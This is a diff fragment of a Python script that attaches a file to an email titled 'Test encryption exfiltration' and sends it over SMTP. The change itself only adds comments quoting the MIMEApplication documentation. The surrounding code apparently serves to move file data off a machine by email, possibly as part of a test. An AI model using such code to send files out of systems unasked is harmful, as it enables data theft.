@@ -21,7 +21,11 @@ msg['Subject'] = 'Test encryption exfiltration'
 
 msg.set_content('This is a test python email')
 msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name )
-#* https://docs.python.org/3/library/email.mime.html
+#* https://docs.python.org/3/library/email.mime.html#email.mime.application.MIMEApplication
+#* A subclass of MIMENonMultipart, the MIMEApplication class 
+#* is used to represent MIME message objects of major type application. 
+#* _data is a string containing the ***raw byte data.*** 
+#* Optional _subtype specifies the MIME subtype and defaults to octet-stream.
 
 with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
     smtp.ehlo()
